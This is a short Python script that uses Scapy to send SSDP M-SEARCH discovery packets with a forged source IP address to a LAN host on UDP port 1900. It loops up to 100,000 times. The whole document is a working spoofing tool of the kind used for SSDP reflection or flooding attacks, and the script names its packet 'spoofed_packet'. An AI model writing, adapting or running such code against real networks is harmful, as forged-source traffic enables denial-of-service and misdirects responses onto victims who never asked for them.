from scapy.all import *

class SsdpRemote5():

    def __init__(self):
        super(SsdpRemote5, self).__init__()

    def run(self):
        self.running = True
        packetCount = 0
        destAddr = '239.255.255.250'
        while self.running:
            if packetCount > 100000:
                self.running = False

            SSDP_ADDR = destAddr
            SSDP_PORT = 1900;
            SSDP_MX = 1
            SSDP_ST = "ssdp:all"

            payload = "M-SEARCH * HTTP/1.1\r\n" + \
                      "HOST: %s:%d\r\n" % (SSDP_ADDR, SSDP_PORT) + \
                      "MAN: \"ssdp:discover\"\r\n" + \
                      "MX: %d\r\n" % (SSDP_MX,) + \
                      "ST: %s\r\n" % (SSDP_ST,) + "\r\n";
            spoofed_packet = IP(src='192.168.1.223', dst='192.168.1.245') / UDP(sport=80, dport=1900) / payload
            send(spoofed_packet)
            time.sleep(0.2)
            packetCount+=1

r = SsdpRemote5()
r.run()